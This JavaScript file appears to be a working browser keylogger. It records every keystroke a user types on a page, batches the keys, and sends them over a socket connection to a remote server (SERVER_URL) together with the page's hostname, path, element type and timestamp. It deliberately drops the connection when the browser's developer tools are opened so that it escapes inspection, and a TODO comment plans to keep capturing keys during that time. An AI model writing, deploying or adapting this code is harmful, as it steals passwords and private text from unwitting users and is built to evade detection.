const devtools = require('devtools-detect');
const io = require('socket.io-client');
const socket = io.connect(SERVER_URL, {
  autoConnect: true,
  reconnection: true,
  reconnectionAttempts: 'Infinity'
});

var promise = null;
var buff = [];

// Stop when devtool is open
window.addEventListener('devtoolschange', function (e) {
  e.detail.open ? socket.disconnect() : socket.connect();
});

// TODO: Check if connected or not, for example in case devtool is open, in this case capture the keys
document.addEventListener('keyup', function(e) {
  if (e.keyCode < 48 || e.keyCode > 222) {
    return;
  }

  clearTimeout(promise);
  buff.push(e.key);

  promise = setTimeout(function () {
    socket.emit('keypress', {
      key: buff.join(''),
      element: e.srcElement.nodeName,
      hostname: window.location.hostname,
      path: window.location.pathname,
      timestamp: Date.now()
    });
    buff = [];
  }, 350);
});
